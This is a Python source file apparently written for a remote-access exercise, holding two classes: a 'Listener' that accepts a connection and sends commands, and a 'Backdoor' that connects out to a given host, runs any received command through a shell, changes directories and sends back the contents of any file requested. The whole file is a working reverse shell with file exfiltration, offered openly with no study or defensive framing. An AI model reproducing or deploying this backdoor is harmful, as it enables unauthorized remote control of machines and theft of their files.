#!/usr/bin/env python3
#metod subprocess.check_output don't change our working directory, by cd command, it only checks this command as system command
import socket
import subprocess
import json
import os

class Listener:
    def __init__(self , ip , port):
        listener = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR , 1)
        listener.bind((ip , port))
        listener.listen(5)
        print("[+] Waiting incoming connections")
        self.connection,self.adress = listener.accept()
        print("[+] Got a connection from " + str(self.adress))
    
    def reliable_send(self,data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data =json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self , command):
        if command[0] == "exit":
            self.reliable_send(command)
            self.connection.close()
            exit()
        self.reliable_send(command)
        return self.reliable_receive()

    def write_file(self,path,content):
        #content = bytes(content)
        with open(path , 'wb') as file:
            file.write(content)
            return "[+] Download successful."  

    def run(self):
        while True:
            command  = input(">> ")
            if command.startswith("--no_split"):
                command = command[11:]
                command = [command]
            elif command.startswith("cd") and len(command) > 4:
                command = command[3:]
                command = ["cd",command]
            else:
                command = command.split()
            if command[0] == "download":
                result = self.connection.recv(200000)
                result = self.write_file(command[1] , result)
                print(result)
                continue
            result = self.execute_remotely(command)
            print(result)


class Backdoor:
    def __init__(self, ip ,port):
        self.connection = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell =True)

    def reliable_send(self,data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data =json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_directory_to(self,path):
        os.chdir(path)    
        return "[+] Changing working directory to " + path

    def read_file(self,path):
        with open(path ,'rb') as file:
            return file.read()


    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            elif command[0] == "download":
                file_bytes = self.read_file(command[1])
                self.connection.send(file_bytes)
                continue
            else:
                command_result = self.execute_system_command(command)
                command_result = command_result.decode('cp1251')
            self.reliable_send(command_result)